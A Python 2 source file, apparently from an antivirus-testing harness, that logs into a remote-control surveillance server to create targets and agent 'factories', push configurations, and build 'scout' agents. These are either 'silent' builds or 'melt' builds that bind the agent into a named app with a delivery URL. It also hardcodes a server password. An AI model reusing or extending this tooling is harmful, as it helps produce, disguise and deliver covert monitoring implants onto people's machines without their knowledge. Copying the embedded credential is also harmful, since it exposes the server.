__author__ = 'mlosito'

import time
import os
from urllib2 import HTTPError
import re
import traceback

from AVCommon.logger import logging
from AVAgent.rcs_client import Rcs_client


class connection:
    host = ""
    user = "avmonitor"
    passwd = "testriteP123" # old: avmonitorp123
    operation = 'AVMonitor'

    rcs=[]

    def __enter__(self):
        logging.debug("DBG login %s@%s" % (self.user, self.host))
        assert connection.host
        self.conn = Rcs_client(connection.host, connection.user, connection.passwd)
        self.conn.login()
        return self.conn

    def __exit__(self, type, value, traceback):
        logging.debug("DBG logout")
        self.conn.logout()


def create_new_factory(self, operation, target, factory, config):
    with connection() as c:
        assert c
        if not c.logged_in():
            logging.warn("Not logged in")
        logging.debug(
            "DBG type: " + self.ftype + ", operation: " + operation + ", target: " + target + ", factory: " + factory)

        operation_id, group_id = c.operation(operation)
        if not operation_id:
            raise RuntimeError("Cannot get operations")

        # gets all the target with our name in an operation
        targets = c.targets(operation_id, target)

        if len(targets) > 0:
            # keep only one target
            for t in targets[1:]:
                c.target_delete(t)

            target_id = targets[0]

            agents = c.agents(target_id)

            for agent_id, ident, name in agents:
                logging.debug("DBG   %s %s %s" % (agent_id, ident, name))
                if name.startswith(factory):
                    logging.debug("- Delete instance: %s %s" % (ident, name))
                    c.instance_delete(agent_id)
        else:
            logging.debug("- Create target: %s" % target)
            target_id = c.target_create(
                operation_id, target, 'made by vmavtest at %s' % time.ctime())

        factory_id, ident = c.factory_create(
            operation_id, target_id, self.ftype, factory,
            'made by vmavtestat at %s' % time.ctime()
        )

        with open(config) as f:
            conf = f.read()

        conf = re.sub(
            r'"host": ".*"', r'"host": "%s"' % self.host[1], conf)

        #logging.debug("conf: %s" % conf)
        c.factory_add_config(factory_id, conf)

        with open('build/config.actual.json', 'wb') as f:
            f.write(conf)

        return (target_id, factory_id, ident)


#todo: non e' molto bello passargli la funzione di gestione messaggi (result_adder_function)
def build_agent(self, factory, result_adder_function, zipfilename, melt=None, kind="silent",tries=0, ):
    with connection() as c:

        try:
            if os.path.exists(zipfilename):
                os.remove(zipfilename)

            if kind=="melt" and melt:
                logging.debug("- Melt build with: %s" % melt)
                appname = "exp_%s" % self.hostname
                self.param['melt']['appname'] = appname
                self.param['melt']['url'] = "http://%s/%s/" % (c.host, appname)
                if 'deliver' in self.param:
                    self.param['deliver']['user'] = c.myid
                r = c.build_melt(factory, self.param, melt, zipfilename)
            else:
                logging.debug("- Silent build")
                r = c.build(factory, self.param, zipfilename)

        #here ML removed lines to statiacally check extraction

        except HTTPError as err:
            logging.debug("DBG trace %s" % traceback.format_exc())
            if tries <= 3:
                tries += 1
                logging.debug("DBG problem building scout. tries number %s" % tries)
                self.build_agent(factory, result_adder_function, zipfilename, melt, kind, tries)
            else:
                result_adder_function("+ ERROR SCOUT BUILD AFTER %s BUILDS" % tries)
                raise err
        except Exception, e:
            logging.debug("DBG trace %s" % traceback.format_exc())
            result_adder_function("+ ERROR SCOUT BUILD EXCEPTION RETRIEVED")

            raise e
        return zipfilename